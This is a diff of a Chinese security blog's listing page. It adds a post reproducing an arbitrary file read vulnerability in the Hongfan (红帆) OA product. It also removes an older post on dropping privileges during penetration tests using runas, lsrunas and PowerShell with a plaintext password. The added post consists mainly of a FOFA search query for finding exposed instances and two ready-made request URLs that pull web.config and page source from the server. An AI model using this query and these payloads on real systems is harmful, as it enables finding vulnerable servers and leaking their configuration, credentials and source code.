@@ -255,6 +255,81 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
+    <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.top/2023/02/04/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91-%E7%BA%A2%E5%B8%86OA-ioFileExport-aspx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="十三">
+      <meta itemprop="description" content="潜心学习，不骄不躁">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="十三の博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/02/04/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91-%E7%BA%A2%E5%B8%86OA-ioFileExport-aspx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">【漏洞复现】 红帆OA ioFileExport.aspx 任意文件读取漏洞</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-02-04 00:40:44 / 修改时间：00:43:55" itemprop="dateCreated datePublished" datetime="2023-02-04T00:40:44+08:00">2023-02-04</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/fuxian/" itemprop="url" rel="index"><span itemprop="name">-fuxian</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="【漏洞复现】-红帆OA-ioFileExport-aspx-任意文件读取漏洞"><a href="#【漏洞复现】-红帆OA-ioFileExport-aspx-任意文件读取漏洞" class="headerlink" title="【漏洞复现】 红帆OA ioFileExport.aspx 任意文件读取漏洞"></a>【漏洞复现】 红帆OA ioFileExport.aspx 任意文件读取漏洞</h1><p>现在写漏洞复现也加个标签好了，漏洞原理也加标签，以后便于分辨。但是还是那句话，心情不好来搞网安就对了。今天随便找个漏洞来进行浮现，漏洞原理我就不深究了，主要是体验一下拿到漏洞的那种快感。</p>
+<h2 id="fofa语句"><a href="#fofa语句" class="headerlink" title="fofa语句"></a>fofa语句</h2><p><code>fofa：app=&quot;红帆-ioffice&quot;</code></p>
+<h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><p>执行POC得到配置文件、源码等信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/ioffice/prg/set/iocom/ioFileExport.aspx?url=/ioffice/web.config&amp;filename=test.txt&amp;ContentType=application/octet-stream</span><br><span class="line"></span><br><span class="line">/ioffice/prg/set/iocom/ioFileExport.aspx?url=/ioffice/Login.aspx&amp;filename=test.txt&amp;ContentType=application/octet-stream</span><br></pre></td></tr></table></figure>
+
+<p>复现成功</p>
+<p><img src="/2023/02/04/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91-%E7%BA%A2%E5%B8%86OA-ioFileExport-aspx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/image-20230204002138895.png" alt="image-20230204002138895"></p>
+<p>（后面倒是可以来看看）</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
     <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.top/2023/01/25/NTLM%E5%8D%8F%E8%AE%AE/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -484,91 +559,10 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
-    <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.top/2023/01/08/%E7%A8%8B%E5%BA%8F%E9%99%8D%E6%9D%83%E5%90%AF%E5%8A%A8%E6%96%B9%E6%B3%95/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="十三">
-      <meta itemprop="description" content="潜心学习，不骄不躁">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="十三の博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/01/08/%E7%A8%8B%E5%BA%8F%E9%99%8D%E6%9D%83%E5%90%AF%E5%8A%A8%E6%96%B9%E6%B3%95/" class="post-title-link" itemprop="url">程序降权启动方法</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2023-01-08 22:20:29 / 修改时间：22:21:08" itemprop="dateCreated datePublished" datetime="2023-01-08T22:20:29+08:00">2023-01-08</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/penetration/" itemprop="url" rel="index"><span itemprop="name">-penetration</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="程序降权启动方法"><a href="#程序降权启动方法" class="headerlink" title="程序降权启动方法"></a>程序降权启动方法</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">概要:</span><br><span class="line">1.介绍为什么要降权</span><br><span class="line">2.一些降权到方法的方法</span><br></pre></td></tr></table></figure>
-
-<p>(感觉概要还是今后开始写起来吧，要不然以后找自己文章还要想一想)</p>
-<p>而渗透测试中的降权通常是指从system权限降到普通用户权限（从管理员权限降到普通用户权限比较简单，方法很多），往往是为了操作当前用户的一些内容，或者操作一些普通用户的文件。（如捕获桌面、操作注册表等）。就像是如果你是system权限，但是屏幕截图截到的是黑屏，这个时候就需要降权来进行屏幕截图。</p>
-<h2 id="runas"><a href="#runas" class="headerlink" title="runas"></a>runas</h2><p><code>runas /user:a calc.exe</code></p>
-<p>执行玩命令之后会要求你输入密码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">但是会有缺点，需要等待用户手动输入密码，不够自动化。</span><br><span class="line">但是可以借助管道实现自动输入密码，需要借助Sanur工具。</span><br></pre></td></tr></table></figure>
-
-<h2 id="lsrunas工具"><a href="#lsrunas工具" class="headerlink" title="lsrunas工具"></a>lsrunas工具</h2><p>下载地址：</p>
-<p><a target="_blank" rel="noopener" href="http://www.verydoc.com/exeshell.html">http://www.verydoc.com/exeshell.html</a></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cmd：</span><br><span class="line"></span><br><span class="line">lsrunas.exe /user:a /password:123456 /domain: /command:&quot;calc.exe&quot; /runpath:c:\</span><br><span class="line"></span><br><span class="line">注：</span><br><span class="line"></span><br><span class="line">/domain:参数为空表示为本机</span><br><span class="line">从管理员权限降权到普通用户权限</span><br></pre></td></tr></table></figure>
-
-<h2 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$uname</span>=<span class="string">&quot;a&quot;</span></span><br><span class="line"><span class="variable">$pwd</span>=<span class="built_in">ConvertTo-SecureString</span>  <span class="string">&quot;123456&quot;</span> <span class="literal">-AsPlainText</span> –Force</span><br><span class="line"><span class="variable">$cred</span>=<span class="built_in">New-Object</span> System.Management.Automation.PSCredential(<span class="variable">$uname</span>,<span class="variable">$pwd</span>)</span><br><span class="line"><span class="built_in">Start-Process</span> <span class="literal">-FilePath</span>  <span class="string">&quot;calc.exe&quot;</span> <span class="literal">-Credential</span> <span class="variable">$cred</span> </span><br></pre></td></tr></table></figure>
-
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/21/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/21/">21</a><span class="page-number current">22</span><a class="page-number" href="/page/23/">23</a><span class="space">&hellip;</span><a class="page-number" href="/page/58/">58</a><a class="extend next" rel="next" href="/page/23/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
+    <a class="extend prev" rel="prev" href="/page/21/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/21/">21</a><span class="page-number current">22</span><a class="page-number" href="/page/23/">23</a><span class="space">&hellip;</span><a class="page-number" href="/page/59/">59</a><a class="extend next" rel="next" href="/page/23/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
   </nav>
 
 
@@ -636,7 +630,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">174</span>
+          <span class="site-state-item-count">175</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
